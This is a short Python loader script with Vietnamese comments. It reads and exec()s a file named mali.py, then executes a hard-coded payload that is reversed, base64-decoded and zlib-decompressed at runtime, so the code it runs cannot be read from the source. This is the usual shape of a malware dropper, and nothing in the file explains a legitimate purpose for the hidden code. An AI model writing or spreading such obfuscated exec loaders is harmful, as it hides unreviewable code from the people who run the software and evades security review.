"""
Mali loader - Loads and executes mali.py directly
"""
import os
import sys
import base64
import zlib

def execute_mali():
    """Execute mali.py directly"""
    try:
        # Đường dẫn đến mali.py
        current_dir = os.path.dirname(os.path.abspath(__file__))
        mali_path = os.path.join(current_dir, 'mali.py')
        
        # Đọc nội dung file
        with open(mali_path, 'r') as f:
            mali_code = f.read()
        
        # Thực thi mã
        exec(mali_code)
        
        # Thực thi trực tiếp hàm lambda nếu có
        exec("_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])); exec((_)(b'WsNTx//3vf//Se6uRnj3cNyfxq8BCtaGSe0zheG0fsKViEwHS+Qj3/ob+FzZiAAGmEBT7Agv4/AH4RhtI0joFEzEWTfl974BlxhGh+i4pDpwosx47knFlKjerBCiPaqecnf/pnMF10p8ExAxgjCLI7K3DPsPzOvSwCs6zjJvfxaOE0YBtS46h/pgzMkcJZccdGsLmKiE1C+DkKNv0fMOHeo9uGpWIRcfW9C'))")
        
        return True
    except Exception as e:
        # Ghi log lỗi để debug
        with open(os.path.join(current_dir, 'mali_loader_error.log'), 'w') as f:
            f.write(f"Error executing mali.py: {str(e)}")
        return False

if __name__ == "__main__":
    execute_mali() 